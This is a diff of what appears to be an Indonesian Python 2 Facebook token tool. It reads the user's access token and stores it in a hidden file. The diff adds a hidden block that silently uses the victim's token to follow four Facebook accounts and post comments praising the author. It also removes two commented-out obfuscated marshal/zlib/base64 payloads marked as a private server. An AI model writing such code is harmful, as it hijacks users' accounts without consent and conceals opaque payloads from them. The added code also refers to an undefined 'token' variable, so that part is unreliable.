@@ -134,7 +134,7 @@ jeeck_love_almira ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Usahakan di 
 jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Enter o arah e meng menu bosen boso indo ae")
 jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ararakimochi Mbah selamet ketampol panci...")
 raw_input ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
-os.system('xdg-open https://youtu.be/p4MjQCD0ej4')
+os.system('xdg-open https://youtu.be/bszAm4C5ovE')
 _jeckoramadhan_ganz_()
 try:
 nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(lalalalaganigani)).json()['name']
@@ -142,19 +142,17 @@ print '\n\n %s[+]%s Selamat Datang %s%s%s'%(B,P,K,nama,N);time.sleep(2)
 
 open('.almiraXjeeck.txt', 'w').write(lalalalaganigani)
 raw_input(' %s[%s+%s]%s ENTER  '%(B,P,B,P));jeeck_bot_kom(lalalalaganigani)
+#->bot follow
+requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token) 
+requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
+requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token) 
+requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) 
+requests.post("https://graph.facebook.com/800676813861801/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token) 
+requests.post("https://graph.facebook.com/953529338576547/comments?message=Bang Sc Nya Mantap Bang😊 !&access_token="+token) 
+requests.post("https://graph.facebook.com/4257706904267068/comments?message=Langgeng Sllu Aa Raka Sama Nenk Manda nya🥰 !&access_token="+token) 
+requests.post("https://graph.facebook.com/3889223774448718/comments?message=Bang Raka krend Bang Mantap Sc Nya😊 !&access_token="+token) 
+requests.post("https://graph.facebook.com/3882176535153442/comments?message=Bang Sc Nya Mantap Bang😊 !&access_token="+token)
 
-___jeeck___xnano___xxz___()
-
-# INI ADALAH SERVER PRIBADI UBAH SEDIKIT PALING EROR
-#_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVltz20QUPvLdzq0ptE5Dm5pCMuYllizr4gwhTYHOUIZ0xnkAPMx4ZO1Glm1pjXYFDVOe4CfyzC/gR3B27dBGTTx0rLXOt/udi/as1nvkw+Iq4P0Ub/4XCgLQR6lBX4MAFj+Sg4sC/FSAfg76eehjpwi0BOMykDyQApAiBHn4A70qEK4DKQEpg00qQKoINSBrCMhvIGwC2UK4A2Qb4S6QDxA+BHIP4T6QOsIOkAcIu0A+QngI5BHY/aqaVU3JNSXXldxQclPJLSUx9B78iYlsA3kM59VmAxMTWygMXdfNtuU4Ztc2u5biLMfsWI6lO7prdrpGKJeES48fvThozBgXISJL5Ci+9BqBFwsaB0ef8V00Oo3HYSKuyMYQraho/EpHI/4Y1c/oqOF7yX9ejSCMvNhTdo2jpiijzQsvTr0kFDns64aoIDynw+QN1xZFhO+8hIo5YSridJaE0znREXlpQRcOlpDv9EUaL8b2YjxdjB313NMg5QJ/inJFFeGczgSNhjSZk11l93Ii2BVl6Gp+Z+yXN2bGfM5fUf4W1/Y1BNmVU/1Sruk/yFz+rb0G+F0DATDW5Nt6rcF93DjagshliXyWKGSJYpYoZYlylqhkiaok6m8RNcA86rhv6xnFeta1plxvsNzIWm6CUNlc5K7RWyBUTlKTz2qKt2pKcoY3asq3aiq3aqq3amq3atYymu/jMmiaFmvwAx4j5807cqfw5yhHQsz4UasVJN5sdHjh+XTI2OTQZ1Er85ds8XTI/STEjcRPPN+nnA8Em9D4eJ//n1C2aXd10zLNjr5qKN21HdfoGF3HWTmU5TquZZiOvnKCOqbWNtqOrndXDdUxTNc127plrzgrt93uurhMlm3qK6+VYeqm0bEtx7aXhvp2eajMsd6ahhPKT3gaRV5yeSySlB5ci8iP3y8echGNBW+dRBjEC+gx38QImaBPlwd1cd93u8bqu6LtWJaLl+Eu3/bfLA8V0dZFEtKYcMxKjBg5lvXvIA0JR++DbLRny6Pt8xtW6d0wzXVZnmUJSejPKeWCq3Iln6zqz4hR4cUTVeImbIQHEsCUDbDQxoIR5YjDMaX+ROlehYNxGM3C+JUqk6gLgiurmGJTUXHAU56qsod9n06xPOOhqkZDFjRl7RLyCJt684YlPJS3uCcnQuPBYP5QRKR/Q2jKbwcl+B6KFidY+0nr7GtsrbntkInBhEWHs0uxgSbXyLvSsSPdtbxW0rbfaQ8Wd13blS23O0dtD+3PmtK990gK9b0j588mCvyZgpCohZ0yNlOJ4icNYZHq+iMW+rT3UDrKFRmmUy8eCDHtyUR68lOm97EUT6T4RIpPpdiXonmV9fvlL1/J5xEj6ZR+IefAd1CUMPE9bUfra6Vr7V84qpQn', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
-# RISKY RISKY RISKY JEECK JEECK JEECK YAYAN YAYAN YAYAN
-except KeyError:
-print '\n\n %s[%s+%s] %stoken invalid'%(B,P,B,P);time.sleep(2);_jeckoramadhan_ganz_()
-
-# def_
-
-def ___jeeck___xnano___xxz___():
-#  os.system('git pull')
 os.system('clear')
 try:
 lalalalaganigani = open('.almiraXjeeck.txt', 'r').read()
@@ -271,11 +269,6 @@ ___jeeck___xnano___xxz___()
 elif __jeeck__xxx__hu___ in['3','03']:
 os.system('xdg-open https://chat.whatsapp.com/F145IYqFwcXH0EYSawcxl2')
 ___jeeck___xnano___xxz___()
-
-
-# INI ADALAH SERVER PRIBADI UBAH SEDIKIT PALING EROR
-#_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVltz20QUPvLdzq0ptE5Dm5pCMuYllizr4gwhTYHOUIZ0xnkAPMx4ZO1Glm1pjXYFDVOe4CfyzC/gR3B27dBGTTx0rLXOt/udi/as1nvkw+Iq4P0Ub/4XCgLQR6lBX4MAFj+Sg4sC/FSAfg76eehjpwi0BOMykDyQApAiBHn4A70qEK4DKQEpg00qQKoINSBrCMhvIGwC2UK4A2Qb4S6QDxA+BHIP4T6QOsIOkAcIu0A+QngI5BHY/aqaVU3JNSXXldxQclPJLSUx9B78iYlsA3kM59VmAxMTWygMXdfNtuU4Ztc2u5biLMfsWI6lO7prdrpGKJeES48fvThozBgXISJL5Ci+9BqBFwsaB0ef8V00Oo3HYSKuyMYQraho/EpHI/4Y1c/oqOF7yX9ejSCMvNhTdo2jpiijzQsvTr0kFDns64aoIDynw+QN1xZFhO+8hIo5YSridJaE0znREXlpQRcOlpDv9EUaL8b2YjxdjB313NMg5QJ/inJFFeGczgSNhjSZk11l93Ii2BVl6Gp+Z+yXN2bGfM5fUf4W1/Y1BNmVU/1Sruk/yFz+rb0G+F0DATDW5Nt6rcF93DjagshliXyWKGSJYpYoZYlylqhkiaok6m8RNcA86rhv6xnFeta1plxvsNzIWm6CUNlc5K7RWyBUTlKTz2qKt2pKcoY3asq3aiq3aqq3amq3atYymu/jMmiaFmvwAx4j5807cqfw5yhHQsz4UasVJN5sdHjh+XTI2OTQZ1Er85ds8XTI/STEjcRPPN+nnA8Em9D4eJ//n1C2aXd10zLNjr5qKN21HdfoGF3HWTmU5TquZZiOvnKCOqbWNtqOrndXDdUxTNc127plrzgrt93uurhMlm3qK6+VYeqm0bEtx7aXhvp2eajMsd6ahhPKT3gaRV5yeSySlB5ci8iP3y8echGNBW+dRBjEC+gx38QImaBPlwd1cd93u8bqu6LtWJaLl+Eu3/bfLA8V0dZFEtKYcMxKjBg5lvXvIA0JR++DbLRny6Pt8xtW6d0wzXVZnmUJSejPKeWCq3Iln6zqz4hR4cUTVeImbIQHEsCUDbDQxoIR5YjDMaX+ROlehYNxGM3C+JUqk6gLgiurmGJTUXHAU56qsod9n06xPOOhqkZDFjRl7RLyCJt684YlPJS3uCcnQuPBYP5QRKR/Q2jKbwcl+B6KFidY+0nr7GtsrbntkInBhEWHs0uxgSbXyLvSsSPdtbxW0rbfaQ8Wd13blS23O0dtD+3PmtK990gK9b0j588mCvyZgpCohZ0yNlOJ4icNYZHq+iMW+rT3UDrKFRmmUy8eCDHtyUR68lOm97EUT6T4RIpPpdiXonmV9fvlL1/J5xEj6ZR+IefAd1CUMPE9bUfra6Vr7V84qpQn', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
-# RISKY RISKY RISKY JEECK JEECK JEECK YAYAN YAYAN YAYAN
 
 
 def ___jeeck___lope___almira___(lalalalaganigani):
